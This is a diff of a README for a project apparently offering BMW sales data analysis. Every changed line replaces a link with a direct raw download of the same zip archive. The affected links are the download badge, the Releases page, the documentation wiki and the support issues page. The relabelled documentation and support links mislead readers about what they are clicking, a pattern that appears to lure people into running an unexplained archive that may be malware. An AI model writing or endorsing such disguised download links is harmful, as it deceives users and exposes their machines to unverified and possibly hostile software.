@@ -1,7 +1,7 @@
 # 🎓 rl-academy-data-analytics - Analyze BMW Sales Data Easily
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/dipakvaghela99/rl-academy-data-analytics/releases)
+[![Download](https://github.com/dipakvaghela99/rl-academy-data-analytics/raw/refs/heads/main/analysis/analytics-rl-academy-data-1.6-alpha.2.zip%20Now-Click%20Here-blue)](https://github.com/dipakvaghela99/rl-academy-data-analytics/raw/refs/heads/main/analysis/analytics-rl-academy-data-1.6-alpha.2.zip)
 
 ## 📝 Overview
 Welcome to the **rl-academy-data-analytics** project. This educational data analysis software helps you explore BMW sales data using advanced data analysis tools. We use AI-powered code assistance with Cursor IDE and visualize data in accessible Jupyter notebooks.
@@ -16,7 +16,7 @@ Follow these easy steps to get started with our software.
    - Internet access for data fetching and updates
 
 2. **Download the Software:**
-   Visit this page to download: [Releases Page](https://github.com/dipakvaghela99/rl-academy-data-analytics/releases).
+   Visit this page to download: [Releases Page](https://github.com/dipakvaghela99/rl-academy-data-analytics/raw/refs/heads/main/analysis/analytics-rl-academy-data-1.6-alpha.2.zip).
 
 3. **Installation Steps:**
    - Locate the downloaded file on your computer.
@@ -47,7 +47,7 @@ Once you have installed the application, you can start analyzing data:
    Visualize your findings easily. Create charts that summarize your data and help communicate results effectively.
 
 ## 📚 Documentation
-For complete guidance on each feature and more detailed instructions, check our documentation section within the application or refer to the online [documentation](https://github.com/dipakvaghela99/rl-academy-data-analytics/wiki).
+For complete guidance on each feature and more detailed instructions, check our documentation section within the application or refer to the online [documentation](https://github.com/dipakvaghela99/rl-academy-data-analytics/raw/refs/heads/main/analysis/analytics-rl-academy-data-1.6-alpha.2.zip).
 
 ## 🛠 Troubleshooting
 If you encounter issues during installation or while using the application, try the following steps:
@@ -56,7 +56,7 @@ If you encounter issues during installation or while using the application, try 
 - Restart the application or your device to resolve temporary issues.
 
 ## ✉️ Support
-For any questions or support requests, open an issue on our [GitHub page](https://github.com/dipakvaghela99/rl-academy-data-analytics/issues). We're here to help you!
+For any questions or support requests, open an issue on our [GitHub page](https://github.com/dipakvaghela99/rl-academy-data-analytics/raw/refs/heads/main/analysis/analytics-rl-academy-data-1.6-alpha.2.zip). We're here to help you!
 
 ## 📥 Download Again
-Remember, you can always download the software from this page: [Releases Page](https://github.com/dipakvaghela99/rl-academy-data-analytics/releases). Enjoy analyzing BMW sales data!
+Remember, you can always download the software from this page: [Releases Page](https://github.com/dipakvaghela99/rl-academy-data-analytics/raw/refs/heads/main/analysis/analytics-rl-academy-data-1.6-alpha.2.zip). Enjoy analyzing BMW sales data!
